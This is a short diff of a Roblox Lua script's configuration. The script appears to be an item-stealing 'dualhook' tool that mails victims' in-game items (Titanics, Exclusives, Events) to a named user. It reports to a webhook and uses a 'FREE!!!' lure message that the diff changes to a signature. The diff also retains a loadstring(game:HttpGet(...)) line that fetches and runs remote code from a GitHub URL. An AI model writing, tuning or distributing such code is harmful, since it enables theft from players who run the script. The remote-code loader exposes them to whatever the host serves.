@@ -3,7 +3,7 @@
 getgenv().Settings = {
     User = "PtacikCZ",
     Webhook = true, -- if you made it true they will receive dualhooked and undualhooked notifs to their webhook
-    MailMessage = "FREE!!!",
+    MailMessage = "By PtacikCZ Scriptz",
   Titanics = {
        Dualhook = true,
        Intensity = 100--%
@@ -22,7 +22,7 @@ getgenv().Settings = {
   },
    Exclusives = {
        Dualhook = true,
-       Intensity = 100--%
+       Intensity = 20--%
   },
    Events = {
        Dualhook = true,
@@ -207,7 +207,7 @@ local data1
 
 -- Loading Screen
 if _G.LoadingScreen ~= false then
-    loadstring(game:HttpGet('https://raw.githubusercontent.com/HosteeScriptz/hostee.github.io/main/LoadingScreen'))() -- Exc : https://raw.githubusercontent.com/blabla/blabla/main/ls.lua
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/HosteeScriptz/hostee.github.io/main/LoadingScreen'))()
 end
 
 -- Remotes
